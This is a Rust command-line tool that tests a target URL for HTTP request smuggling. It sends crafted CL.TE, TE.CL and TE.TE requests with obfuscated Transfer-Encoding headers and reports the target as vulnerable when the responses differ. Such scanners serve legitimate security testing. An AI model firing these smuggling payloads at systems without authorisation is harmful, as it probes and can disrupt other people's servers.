use clap::Parser;
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use rustls::pki_types::ServerName;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;
use std::io::Write;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;
use url::Url;
use chrono::Utc;

/// HTTP Request Smuggling tester
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Target URL
    #[arg(required = true)]
    url: String,

    /// Custom method for the attack request
    #[arg(short, long, default_value = "POST")]
    method: String,

    /// Socket timeout in seconds
    #[arg(short, long, default_value_t = 10)]
    timeout: u64,

    /// Verbose mode
    #[arg(short, long, action = clap::ArgAction::SetTrue)]
    verbose: bool,

    /// Output file for results (JSON format)
    #[arg(short, long)]
    output: Option<String>,

    /// Custom headers (format: "Header: Value")
    #[arg(short = 'H', long = "header")]
    headers: Vec<String>,
}

/// Result of a vulnerability check
#[derive(Debug, Serialize, Deserialize)]
struct CheckResult {
    check_type: String,
    vulnerable: bool,
    payload_index: Option<usize>,
    normal_status: String,
    attack_status: Option<String>,
    normal_duration_ms: u64,
    attack_duration_ms: Option<u64>,
    timestamp: String,
}

/// Overall scan results
#[derive(Debug, Serialize, Deserialize)]
struct ScanResults {
    target: String,
    method: String,
    timestamp: String,
    checks: Vec<CheckResult>,
}

/// Parameters for running vulnerability checks
struct CheckParams<'a> {
    pb: &'a ProgressBar,
    check_name: &'a str,
    host: &'a str,
    port: u16,
    path: &'a str,
    attack_requests: Vec<String>,
    timeout: u64,
    verbose: bool,
    use_tls: bool,
}

/// Sends a raw HTTP request and returns the response and duration.
async fn send_request(
    host: &str,
    port: u16,
    request: &str,
    timeout: u64,
    verbose: bool,
    use_tls: bool,
) -> Result<(String, Duration), Box<dyn Error>> {
    if verbose {
        println!("\n{}", "--- REQUEST ---".bold().blue());
        println!("{}", request.cyan());
    }

    let addr = format!("{}:{}", host, port);
    let start = Instant::now();
    
    let response_str = if use_tls {
        let mut root_store = rustls::RootCertStore::empty();
        root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        
        let config = rustls::ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth();
        
        let connector = TlsConnector::from(Arc::new(config));
        let stream = TcpStream::connect(&addr).await?;
        let domain = ServerName::try_from(host.to_string())?;
        let mut tls_stream = connector.connect(domain, stream).await?;
        
        tls_stream.write_all(request.as_bytes()).await?;
        
        let mut buf = Vec::new();
        tokio::time::timeout(Duration::from_secs(timeout), tls_stream.read_to_end(&mut buf)).await??;
        String::from_utf8_lossy(&buf).to_string()
    } else {
        let mut stream = TcpStream::connect(&addr).await?;
        stream.write_all(request.as_bytes()).await?;
        
        let mut buf = Vec::new();
        tokio::time::timeout(Duration::from_secs(timeout), stream.read_to_end(&mut buf)).await??;
        String::from_utf8_lossy(&buf).to_string()
    };
    
    let duration = start.elapsed();
    
    if verbose {
        println!("\n{}", "--- RESPONSE ---".bold().blue());
        println!("{}", response_str.white());
    }

    Ok((response_str, duration))
}

/// Runs a set of attack requests for a given check type.
async fn run_checks_for_type(params: CheckParams<'_>) -> Result<CheckResult, Box<dyn Error>> {
    if !params.verbose {
        params.pb.set_message(format!("Checking for {}...", params.check_name));
    } else {
        println!("\n{}", format!("[!] Checking for {} vulnerability", params.check_name).bold());
    }
    
    let (normal_response, normal_duration) = send_request(params.host, params.port, &format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        params.path, params.host
    ), params.timeout, params.verbose, params.use_tls).await?;
    let normal_status = normal_response.lines().next().unwrap_or("").to_string();

    let mut vulnerable = false;
    let mut result_payload_index = None;
    let mut result_attack_status = None;
    let mut result_attack_duration = None;
    
    for (i, attack_request) in params.attack_requests.iter().enumerate() {
        match send_request(params.host, params.port, attack_request, params.timeout, params.verbose, params.use_tls).await {
            Ok((attack_response, attack_duration)) => {
                let attack_status = attack_response.lines().next().unwrap_or("");
                if attack_response.len() != normal_response.len() || attack_status != normal_status {
                    vulnerable = true;
                    result_payload_index = Some(i);
                    result_attack_status = Some(attack_status.to_string());
                    result_attack_duration = Some(attack_duration);
                    
                    let result_text = format!("[!] {} Result:", params.check_name);
                    let vulnerable_text = "[!!!] VULNERABLE".red().bold();
                    if params.verbose {
                        println!("\n{}", result_text.bold());
                        println!("  {}", vulnerable_text);
                        println!("  {} Payload index: {}", "[+] ".green(), i);
                        println!("  {} Normal response status: {} (took {:.2?})", "[+] ".green(), normal_status, normal_duration);
                        println!("  {} Attack response status: {} (took {:.2?})", "[+] ".green(), attack_status, attack_duration);
                    } else {
                        params.pb.println(format!("\n{}", result_text.bold()));
                        params.pb.println(format!("  {}", vulnerable_text));
                        params.pb.println(format!("  {} Payload index: {}", "[+] ".green(), i));
                        params.pb.println(format!("  {} Normal response status: {} (took {:.2?})", "[+] ".green(), normal_status, normal_duration));
                        params.pb.println(format!("  {} Attack response status: {} (took {:.2?})", "[+] ".green(), attack_status, attack_duration));
                    }
                    break;
                }
            }
            Err(e) => {
                 let error_text = format!("\n{} Error during {} attack request (payload {}): {}", "[!] ".yellow(), params.check_name, i, e);
                 if params.verbose { println!("{}", error_text); } else { params.pb.println(error_text); }
            }
        }
    }

    if !vulnerable {
        let result_text = format!("[!] {} Result:", params.check_name);
        let not_vulnerable_text = "[+] Not Vulnerable".green();
        if params.verbose {
            println!("\n{}", result_text.bold());
            println!("  {}", not_vulnerable_text);
        } else {
            params.pb.println(format!("\n{}", result_text.bold()));
            params.pb.println(format!("  {}", not_vulnerable_text));
        }
    }

    Ok(CheckResult {
        check_type: params.check_name.to_string(),
        vulnerable,
        payload_index: result_payload_index,
        normal_status: normal_status.clone(),
        attack_status: result_attack_status,
        normal_duration_ms: normal_duration.as_millis() as u64,
        attack_duration_ms: result_attack_duration.map(|d| d.as_millis() as u64),
        timestamp: Utc::now().to_rfc3339(),
    })
}

fn get_cl_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

fn get_te_cl_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

fn get_te_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    let te_variations = vec![
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip, chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity"),
    ];
    
    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, te1, te2
        ));
    }
    payloads
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let cli = Cli::parse();

    let url = Url::parse(&cli.url)?;
    let host = url.host_str().ok_or("Invalid host")?;
    let port = url.port_or_known_default().ok_or("Invalid port")?;
    let path = url.path();
    let method = &cli.method;
    let timeout = cli.timeout;
    let verbose = cli.verbose;
    let use_tls = url.scheme() == "https";

    println!();
    println!("{} {}", "Target:".bold(), host.cyan());
    println!("{}   {}", "Method:".bold(), method.cyan());
    println!("{} {}", "Timeout:".bold(), format!("{}s", timeout).cyan());
    println!("{} {}", "Protocol:".bold(), if use_tls { "HTTPS".cyan() } else { "HTTP".cyan() });
    if !cli.headers.is_empty() {
        println!("{} {}", "Custom Headers:".bold(), cli.headers.len().to_string().cyan());
    }
    if verbose {
        println!("{} {}", "Verbose:".bold(), "Enabled".cyan());
    }
    if let Some(ref output_file) = cli.output {
        println!("{} {}", "Output:".bold(), output_file.cyan());
    }
    println!();

    let pb = ProgressBar::new_spinner();
    if !verbose {
        pb.enable_steady_tick(Duration::from_millis(120));
        pb.set_style(
            ProgressStyle::with_template("{spinner:.blue} {msg}")
                .unwrap()
                .tick_strings(&[
                    "▸▹▹▹▹",
                    "▹▸▹▹▹",
                    "▹▹▸▹▹",
                    "▹▹▹▸▹",
                    "▹▹▹▹▸",
                ]),
        );
    } else {
        pb.finish_and_clear();
    }

    let mut results = Vec::new();

    let cl_te_payloads = get_cl_te_payloads(path, host, method, &cli.headers);
    let result = run_checks_for_type(CheckParams {
        pb: &pb,
        check_name: "CL.TE",
        host,
        port,
        path,
        attack_requests: cl_te_payloads,
        timeout,
        verbose,
        use_tls,
    }).await?;
    results.push(result);
    pb.inc(1);

    let te_cl_payloads = get_te_cl_payloads(path, host, method, &cli.headers);
    let result = run_checks_for_type(CheckParams {
        pb: &pb,
        check_name: "TE.CL",
        host,
        port,
        path,
        attack_requests: te_cl_payloads,
        timeout,
        verbose,
        use_tls,
    }).await?;
    results.push(result);
    pb.inc(1);

    let te_te_payloads = get_te_te_payloads(path, host, method, &cli.headers);
    let result = run_checks_for_type(CheckParams {
        pb: &pb,
        check_name: "TE.TE",
        host,
        port,
        path,
        attack_requests: te_te_payloads,
        timeout,
        verbose,
        use_tls,
    }).await?;
    results.push(result);
    pb.inc(1);

    if !verbose {
        pb.finish_with_message(format!("{} {}", "✔".green(), "Checks finished!".bold()));
    } else {
        println!("\n{}", "✔ Checks finished!".bold().green());
    }

    // Save results to file if requested
    if let Some(output_file) = cli.output {
        let scan_results = ScanResults {
            target: cli.url.clone(),
            method: method.clone(),
            timestamp: Utc::now().to_rfc3339(),
            checks: results,
        };
        
        let json_output = serde_json::to_string_pretty(&scan_results)?;
        let mut file = fs::File::create(&output_file)?;
        file.write_all(json_output.as_bytes())?;
        
        println!("\n{} Results saved to: {}", "✔".green().bold(), output_file.cyan());
    }

    Ok(())
}